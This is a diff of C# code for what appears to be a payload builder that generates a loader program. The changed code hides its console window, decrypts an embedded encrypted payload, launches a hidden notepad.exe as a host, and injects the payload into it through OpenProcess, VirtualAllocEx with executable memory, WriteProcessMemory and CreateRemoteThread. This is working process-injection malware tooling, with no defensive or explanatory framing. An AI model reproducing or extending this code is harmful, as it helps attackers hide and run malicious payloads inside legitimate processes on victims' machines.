@@ -128,7 +128,20 @@ namespace WindowsFormsApp1
                                                 var handle = ConstantsAndExtCalls.GetConsoleWindow();
                                                 ConstantsAndExtCalls.ShowWindow(handle, ConstantsAndExtCalls.SW_HIDE);
                                                 byte[] KEY = {" + decKey + @"};
-                                                var pid = (Process.GetProcessesByName("""+proc+@""")[0]).Id;
+
+                                                //start the host process in the background
+                                                Process p = new Process();
+                                                p.StartInfo = new ProcessStartInfo(""" + "notepad.exe" + @""");
+                                            
+                                                p.StartInfo.CreateNoWindow = true;
+
+                                                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                                                p.Start();
+                                                var pid = p.Id;
+                                                //var pid = (Process.GetProcessesByName(""" + proc+@""")[0]).Id;
+
+
+
                                                 string Payload_Encrypted = """ + encPayload +
                                                 @""";string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(',');
 
@@ -144,8 +157,9 @@ namespace WindowsFormsApp1
 
                                                 uint dwThreadId = 0;
 
-                                                var handle_1 = ConstantsAndExtCalls.OpenProcess(ConstantsAndExtCalls.PROCCESS_ALL_ACCESS, false, pid);
-                                                IntPtr funcAddress = ConstantsAndExtCalls.VirtualAllocEx(handle_1, IntPtr.Zero, (UInt32)Finall_Payload.Length, ConstantsAndExtCalls.VIRTUAL_MEM, ConstantsAndExtCalls.PAGE_EXECUTE_READWRITE);
+
+                                                var handle_1 = ConstantsAndExtCalls.OpenProcess(ConstantsAndExtCalls.PROCESS_CREATE_THREAD| ConstantsAndExtCalls.PROCESS_VM_READ | ConstantsAndExtCalls.PROCESS_QUERY_INFORMATION| ConstantsAndExtCalls.PROCESS_VM_OPERATION | ConstantsAndExtCalls.PROCESS_VM_WRITE, true, pid); 
+                                                IntPtr funcAddress = ConstantsAndExtCalls.VirtualAllocEx(handle_1, IntPtr.Zero, (UInt32)Finall_Payload.Length, ConstantsAndExtCalls.MEM_COMMIT|ConstantsAndExtCalls.MEM_RESERVE, ConstantsAndExtCalls.PAGE_EXECUTE_READWRITE);
                                                 ConstantsAndExtCalls.WriteProcessMemory((int)handle_1, (int)funcAddress, Finall_Payload, Finall_Payload.Length, ref dwThreadId);
                                                 ConstantsAndExtCalls.CreateRemoteThread(handle_1, IntPtr.Zero, 0, funcAddress, IntPtr.Zero, 0, out dwThreadId);
 
